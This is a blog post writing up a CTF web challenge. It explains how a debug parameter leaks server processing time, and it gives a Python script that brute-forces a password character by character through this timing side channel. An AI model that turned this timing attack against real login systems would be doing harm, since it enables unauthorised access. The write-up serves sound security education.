<!DOCTYPE html>
<html itemscope="" itemtype="http://schema.org/WebPage" lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0" name="viewport"/>
<title>[Writeup] ROP: 05 - Guessing Word - ErbaZZ's Blog</title>
<meta content="[Writeup] ROP: 05 - Guessing Word" property="og:title"/>
<meta content="[Writeup] ROP: 05 - Guessing Word" name="twitter:title"/>
<meta content="DISCLAIMER: game.rop.sh was discontinued and is no longer available.
Challenge Name: Guessing Word
Type: Web
Score: 200 pts
Link: https://game.rop.sh
Guessing Word challenge description" name="description"/>
<meta content="DISCLAIMER: game.rop.sh was discontinued and is no longer available.
Challenge Name: Guessing Word
Type: Web
Score: 200 pts
Link: https://game.rop.sh
Guessing Word challenge description" property="og:description"/>
<meta content="DISCLAIMER: game.rop.sh was discontinued and is no longer available.
Challenge Name: Guessing Word
Type: Web
Score: 200 pts
Link: https://game.rop.sh
Guessing Word challenge description" name="twitter:description"/>
<meta content="ErbaZZ" name="author"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "ErbaZZ\u0027s Blog",
    
    "url": "https:\/\/erbazz.github.io"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/erbazz.github.io"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/erbazz.github.io",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/erbazz.github.io\/writeup\/rop_05_guessingword\/",
          "name": "[ writeup] r o p 05 guessing word"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : "ErbaZZ"
  },
  "headline": "[Writeup] ROP: 05 - Guessing Word",
  "description" : "DISCLAIMER: game.rop.sh was discontinued and is no longer available.\nChallenge Name: Guessing Word\nType: Web\nScore: 200 pts\nLink: https:\/\/game.rop.sh\nGuessing Word challenge description\n",
  "inLanguage" : "en",
  "wordCount":  756 ,
  "datePublished" : "2020-03-17T22:00:00",
  "dateModified" : "2020-03-17T22:00:00",
  "image" : "https:\/\/erbazz.github.io",
  "keywords" : [ "rop, web, ctf, writeup" ],
  "mainEntityOfPage" : "https:\/\/erbazz.github.io\/writeup\/rop_05_guessingword\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/erbazz.github.io",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/erbazz.github.io",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>
<meta content="[Writeup] ROP: 05 - Guessing Word" property="og:title"/>
<meta content="DISCLAIMER: game.rop.sh was discontinued and is no longer available.
Challenge Name: Guessing Word
Type: Web
Score: 200 pts
Link: https://game.rop.sh
Guessing Word challenge description" property="og:description"/>
<meta content="https://erbazz.github.io/writeup/rop_05_guessingword/" property="og:url"/>
<meta content="website" property="og:type"/>
<meta content="ErbaZZ's Blog" property="og:site_name"/>
<meta content="[Writeup] ROP: 05 - Guessing Word" name="twitter:title"/>
<meta content="DISCLAIMER: game.rop.sh was discontinued and is no longer available.
Challenge Name: Guessing Word
Type: Web
Score: 200 pts
Link: https://game.rop.sh
Guessing Word challenge description" name="twitter:description"/>
<meta content="summary" name="twitter:card"/>
<meta content="summary" name="twitter:card"/>
<meta content="https://erbazz.github.io/writeup/rop_05_guessingword/" property="og:url"/>
<meta content="website" property="og:type"/>
<meta content="ErbaZZ's Blog" property="og:site_name"/>
<meta content="Hugo 0.74.3" name="generator"/>
<link href="https://erbazz.github.io/index.xml" rel="alternate" title="ErbaZZ's Blog" type="application/rss+xml"/>
<link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" rel="stylesheet"/>
<link crossorigin="anonymous" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" rel="stylesheet"/>
<link crossorigin="anonymous" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" rel="stylesheet"/>
<link href="https://erbazz.github.io/css/main.css" rel="stylesheet"/><link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet"/>
<link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet"/>
<link href="https://erbazz.github.io/css/highlight.min.css" rel="stylesheet"/><link href="https://erbazz.github.io/css/codeblock.css" rel="stylesheet"/><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" rel="stylesheet"/>
<link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" rel="stylesheet"/>
<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-131117344-1"></script>
<script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'UA-131117344-1');
    </script>
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-131117344-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async="" src="https://www.google-analytics.com/analytics.js"></script>
</head>
<body>
<nav class="navbar navbar-default navbar-fixed-top navbar-custom">
<div class="container-fluid">
<div class="navbar-header">
<button class="navbar-toggle" data-target="#main-navbar" data-toggle="collapse" type="button">
<span class="sr-only">Toggle navigation</span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
<a class="navbar-brand" href="https://erbazz.github.io"> <span style="color: #ff8080">#</span> ErbaZZ's Blog <span class="logo__cursor"></span></a>
</div>
<div class="collapse navbar-collapse" id="main-navbar">
<ul class="nav navbar-nav navbar-right">
<li>
<a href="/" title="Home">Home</a>
</li>
<li>
<a href="/writeup/" title="Writeup">Writeup</a>
</li>
<li>
<a href="/about/" title="About">About</a>
</li>
<li>
<a data-target="#modalSearch" data-toggle="modal" href="#modalSearch" style="outline: none;">
<span class="hidden-sm hidden-md hidden-lg">Search</span> <span class="glyphicon glyphicon-search" id="searchGlyph"></span>
</a>
</li>
</ul>
</div>
</div>
</nav>
<div class="modal fade" id="modalSearch" role="dialog">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<button class="close" data-dismiss="modal" type="button">×</button>
<h4 class="modal-title">Search ErbaZZ's Blog</h4>
</div>
<div class="modal-body">
<gcse:search></gcse:search>
</div>
<div class="modal-footer">
<button class="btn btn-default" data-dismiss="modal" type="button">Close</button>
</div>
</div>
</div>
</div>
<div aria-hidden="true" class="pswp" role="dialog" tabindex="-1">
<div class="pswp__bg"></div>
<div class="pswp__scroll-wrap">
<div class="pswp__container">
<div class="pswp__item"></div>
<div class="pswp__item"></div>
<div class="pswp__item"></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class="pswp__top-bar">
<div class="pswp__counter"></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title="Share"></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class="pswp__preloader">
<div class="pswp__preloader__icn">
<div class="pswp__preloader__cut">
<div class="pswp__preloader__donut"></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class="pswp__share-tooltip"></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class="pswp__caption">
<div class="pswp__caption__center"></div>
</div>
</div>
</div>
</div>
<header class="header-section">
<div class="intro-header no-img">
<div class="container">
<div class="row">
<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
<div class="writeup-heading">
<h1>[Writeup] ROP: 05 - Guessing Word</h1>
<hr class="small"/>
</div>
</div>
</div>
</div>
</div>
</header>
<div class="container" role="main">
<div class="row">
<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
<article class="blog-post" role="main">
<p><strong>DISCLAIMER: game.rop.sh was discontinued and is no longer available.</strong></p>
<p><strong>Challenge Name:</strong> Guessing Word<br/>
<strong>Type:</strong> Web<br/>
<strong>Score:</strong> 200 pts<br/>
<strong>Link:</strong> <a href="https://game.rop.sh/task">https://game.rop.sh</a></p>
<p><img alt="Challenge Description" src="/images/rop/05/rop_05_challenge.png"/></p><center><em>Guessing Word challenge description</em></center>
<p>As usual, the challenge provides us with a link to the website. On the website, there’s a text box and a button to submit the password that we need to “GUESS”.</p>
<p><img alt="Challenge Webpage" src="/images/rop/05/rop_05_webpage.png"/></p><center><em>Webpage of the challenge</em></center>
<p>Looking at the page source, we would see this:</p>
<center>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">"en"</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content</span><span class="o">=</span><span class="s">"IE=edge"</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"viewport"</span> <span class="na">content</span><span class="o">=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"description"</span> <span class="na">content</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"author"</span> <span class="na">content</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">"shortcut icon"</span> <span class="na">href</span><span class="o">=</span><span class="s">"../../docs-assets/ico/favicon.png"</span><span class="p">&gt;</span>

    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Guessing Game<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>

    <span class="c">&lt;!-- Bootstrap core CSS --&gt;</span>
    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">href</span><span class="o">=</span><span class="s">"../../css/bootstrap.css"</span> <span class="na">rel</span><span class="o">=</span><span class="s">"stylesheet"</span><span class="p">&gt;</span>

    <span class="c">&lt;!-- Custom styles for this template --&gt;</span>
    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">href</span><span class="o">=</span><span class="s">"signin.css"</span> <span class="na">rel</span><span class="o">=</span><span class="s">"stylesheet"</span><span class="p">&gt;</span>

    <span class="c">&lt;!-- Just for debugging purposes. Don't actually copy this line! --&gt;</span>
    <span class="c">&lt;!--[if lt IE 9]&gt;&lt;script src="../../docs-assets/js/ie8-responsive-file-warning.js"&gt;&lt;/script&gt;&lt;![endif]--&gt;</span>

    <span class="c">&lt;!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries --&gt;</span>
    <span class="c">&lt;!--[if lt IE 9]&gt;
</span><span class="c">      &lt;script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"&gt;&lt;/script&gt;
</span><span class="c">      &lt;script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"&gt;&lt;/script&gt;
</span><span class="c">    &lt;![endif]--&gt;</span>
  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>

  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>

    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"container"</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">form</span> <span class="na">class</span><span class="o">=</span><span class="s">"form-signin"</span> <span class="na">role</span><span class="o">=</span><span class="s">"form"</span> <span class="na">action</span><span class="o">=</span><span class="s">"index.php"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">h3</span> <span class="na">class</span><span class="o">=</span><span class="s">"form-signin-heading"</span><span class="p">&gt;</span>Can you guess my password?<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"password"</span> <span class="na">class</span><span class="o">=</span><span class="s">"form-control"</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">"Password"</span> <span class="na">name</span><span class="o">=</span><span class="s">"password"</span> <span class="na">required</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">button</span> <span class="na">class</span><span class="o">=</span><span class="s">"btn btn-lg btn-primary btn-block"</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span><span class="p">&gt;</span>Enter<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
        <span class="c">&lt;!-- ?debug for DEBUGGING --&gt;</span>
      <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span> <span class="c">&lt;!-- /container --&gt;</span>


    <span class="c">&lt;!-- Bootstrap core JavaScript
</span><span class="c">    ================================================== --&gt;</span>
    <span class="c">&lt;!-- Placed at the end of the document so the pages load faster --&gt;</span>
  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></code></pre></td></tr></table>
</div>
</div>
</center>
<p>We can see that the form would send a POST request with the password in the textbox to <strong>index.php</strong>.
So let’s try inputting <em>test</em> into the form and press <em>Enter</em>.</p>
<p><img alt="Result" src="/images/rop/05/rop_05_wrong.png"/></p><center><em>Result</em></center>
<p>Apparently, we guessed wrong. Let’s see the source.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html">Wrong Password<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span></code></pre></td></tr></table>
</div>
</div>
<p>… Really? That’s it? The whole source is just one line, without any comment as a hint at all.
We need to do something with the input of the form, one of the possibilities would be SQL Injection, but let’s look at the source of the first page again, maybe we could find something.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html">        <span class="p">&lt;</span><span class="nt">button</span> <span class="na">class</span><span class="o">=</span><span class="s">"btn btn-lg btn-primary btn-block"</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span><span class="p">&gt;</span>Enter<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
        <span class="c">&lt;!-- ?debug for DEBUGGING --&gt;</span>
      <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span></code></pre></td></tr></table>
</div>
</div>
<p>Hmmm…? <strong>?debug for DEBUGGING</strong>? Let’s try it then, changing the target of the POST request to <strong>index.php?debug</strong> and submit again.</p>
<p><img alt="Debug Result" src="/images/rop/05/rop_05_wrong.png"/></p><center><em>Result with ?debug</em></center>
<p>The page looks the same; however, something interesting appears in the source.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html">Wrong Password<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span><span class="c">&lt;!-- Process Time: 0 --&gt;</span></code></pre></td></tr></table>
</div>
</div>
<p>A comment telling us the process time! After several tries, we have found out that different inputs yield different processing times, and we can deduct the correct password from the processing time.</p>
<p>The code would probably look somewhat like this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">correct_pass</span> <span class="o">=</span> <span class="s2">"P@ssw0rd"</span>
<span class="nb">input</span> <span class="o">=</span> <span class="p">[</span><span class="n">User</span> <span class="nb">input</span><span class="p">]</span>

<span class="n">wrong</span> <span class="o">=</span> <span class="bp">False</span>

<span class="c1"># Different input sizes yield equal processing time, so it is probably made to be easy to crack.</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">min</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">correct_pass</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="nb">input</span><span class="p">))):</span>
  <span class="k">if</span> <span class="n">correct_pass</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">input</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
    <span class="n">wrong</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="k">break</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">correct_pass</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">len</span><span class="p">(</span><span class="nb">input</span><span class="p">):</span>
  <span class="n">wrong</span> <span class="o">=</span> <span class="bp">True</span>

<span class="k">if</span> <span class="err">!</span><span class="n">wrong</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="s2">"Correct Password"</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="s2">"Wrong Password"</span><span class="p">)</span></code></pre></td></tr></table>
</div>
</div>
<p>With this code, the program would run longer if more characters of the input matches the correct password. Therefore, we can bruteforce it character by character and pick the one with the longest processing time.</p>
<p>I wrote a simple Python script to send POST requests and bruteforce the password.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">url</span> <span class="o">=</span> <span class="s2">"https://game.rop.sh/chall/5/index.php?debug"</span>
  
<span class="n">password</span> <span class="o">=</span> <span class="s2">""</span>
<span class="n">charlist</span> <span class="o">=</span> <span class="s2">"0123456789abcdefghijklmnopqustuvwxyz!@#$%^&amp;*()_-+="</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
    <span class="n">maxtime</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">tempchar</span> <span class="o">=</span> <span class="s1">''</span>
    <span class="n">end</span> <span class="o">=</span> <span class="bp">False</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">charlist</span><span class="p">:</span>
        <span class="n">temppass</span> <span class="o">=</span> <span class="n">password</span> <span class="o">+</span> <span class="n">c</span>
        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'password'</span><span class="p">:</span><span class="n">temppass</span><span class="p">}</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"password"</span><span class="p">:</span><span class="n">temppass</span><span class="p">})</span>
        
        <span class="n">wrong</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">'Wrong'</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">wrong</span><span class="p">:</span>
            <span class="n">tempchar</span> <span class="o">=</span> <span class="n">c</span>
            <span class="n">end</span> <span class="o">=</span> <span class="bp">True</span>
            <span class="k">break</span>

        <span class="n">find</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">'Process Time: ([\d\.]+)'</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">find</span><span class="p">:</span>
            <span class="n">time</span> <span class="o">=</span> <span class="n">find</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">time</span> <span class="o">&gt;</span> <span class="n">maxtime</span><span class="p">:</span>
                <span class="n">maxtime</span> <span class="o">=</span> <span class="n">time</span>
                <span class="n">tempchar</span> <span class="o">=</span> <span class="n">c</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">password</span> <span class="o">+</span> <span class="n">tempchar</span>
    <span class="k">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">end</span><span class="p">:</span>
        <span class="k">break</span>

<span class="k">print</span><span class="p">(</span><span class="s2">"Key = "</span> <span class="o">+</span> <span class="n">password</span><span class="p">)</span></code></pre></td></tr></table>
</div>
</div>
<p>The script would rotate the characters from the list to send as an input, after that, it would save the one with the longest process time and pick the further characters.</p>
<p>After waiting for a while, we got our password.</p>
<p><img alt="Script Output" src="/images/rop/05/rop_05_output.png"/></p><center><em>Script Output</em></center>
<p>Inputting this key manually on the website yields this result:</p>
<p><img alt="Result" src="/images/rop/05/rop_05_key.png"/></p><center><em>Result</em></center>
<p>Success!</p>
<div class="blog-tags">
<a href="https://erbazz.github.io/tags/rop/">rop</a> 
            
              <a href="https://erbazz.github.io/tags/web/">web</a> 
            
              <a href="https://erbazz.github.io/tags/ctf/">ctf</a> 
            
              <a href="https://erbazz.github.io/tags/writeup/">writeup</a> 
            
          </div>
<hr/>
<section id="social-share">
<div class="list-inline footer-links">
<div aria-hidden="true" class="share-box">
<ul class="share">
<li>
<a href="//twitter.com/share?url=https%3a%2f%2ferbazz.github.io%2fwriteup%2frop_05_guessingword%2f&amp;text=%5bWriteup%5d%20ROP%3a%2005%20-%20Guessing%20Word&amp;via=" target="_blank" title="Share on Twitter">
<i class="fab fa-twitter"></i>
</a>
</li>
<li>
<a href="//plus.google.com/share?url=https%3a%2f%2ferbazz.github.io%2fwriteup%2frop_05_guessingword%2f" target="_blank" title="Share on Google Plus">
<i class="fab fa-google-plus"></i>
</a>
</li>
<li>
<a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2ferbazz.github.io%2fwriteup%2frop_05_guessingword%2f" target="_blank" title="Share on Facebook">
<i class="fab fa-facebook"></i>
</a>
</li>
<li>
<a href="//reddit.com/submit?url=https%3a%2f%2ferbazz.github.io%2fwriteup%2frop_05_guessingword%2f&amp;title=%5bWriteup%5d%20ROP%3a%2005%20-%20Guessing%20Word" target="_blank" title="Share on Reddit">
<i class="fab fa-reddit"></i>
</a>
</li>
<li>
<a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2ferbazz.github.io%2fwriteup%2frop_05_guessingword%2f&amp;title=%5bWriteup%5d%20ROP%3a%2005%20-%20Guessing%20Word" target="_blank" title="Share on LinkedIn">
<i class="fab fa-linkedin"></i>
</a>
</li>
<li>
<a href="//www.stumbleupon.com/submit?url=https%3a%2f%2ferbazz.github.io%2fwriteup%2frop_05_guessingword%2f&amp;title=%5bWriteup%5d%20ROP%3a%2005%20-%20Guessing%20Word" target="_blank" title="Share on StumbleUpon">
<i class="fab fa-stumbleupon"></i>
</a>
</li>
<li>
<a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2ferbazz.github.io%2fwriteup%2frop_05_guessingword%2f&amp;description=%5bWriteup%5d%20ROP%3a%2005%20-%20Guessing%20Word" target="_blank" title="Share on Pinterest">
<i class="fab fa-pinterest"></i>
</a>
</li>
</ul>
</div>
</div>
</section>
<h4 class="see-also">See also</h4>
<ul>
<li><a href="/writeup/rop_02_oraclesplan/">[Writeup] ROP: 02 - Oracle's Plan</a></li>
<li><a href="/writeup/hackingcontest2019/">[Writeup] Hacking Contest 2019 (Qualification Round)</a></li>
<li><a href="/writeup/fincybersec2018/">[Writeup] Financial Cybersecurity Bootcamp 2018</a></li>
</ul>
</article>
<ul class="pager blog-pager">
<li class="previous">
<a data-placement="top" data-toggle="tooltip" href="https://erbazz.github.io/writeup/hackingcontest2019/" title="[Writeup] Hacking Contest 2019 (Qualification Round)">← Previous Post</a>
</li>
<li class="next">
<a data-placement="top" data-toggle="tooltip" href="https://erbazz.github.io/writeup/rop_02_oraclesplan/" title="[Writeup] ROP: 02 - Oracle's Plan">Next Post →</a>
</li>
</ul>
</div>
</div>
</div>
<footer>
<div class="container">
<div class="row">
<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
<ul class="list-inline text-center footer-links">
<li>
<a href="https://github.com/ErbaZZ" title="GitHub">
<span class="fa-stack fa-lg">
<i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i>
</span>
</a>
</li>
<li>
<a href="https://linkedin.com/in/weerawatp" title="LinkedIn">
<span class="fa-stack fa-lg">
<i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
</span>
</a>
</li>
</ul>
<p class="credits copyright text-muted">
          
            
              ErbaZZ
            
          

           • ©
          
            2020
          

          
             • 
            <a href="https://erbazz.github.io">ErbaZZ's Blog</a>
</p>
<p class="credits theme-by text-muted">
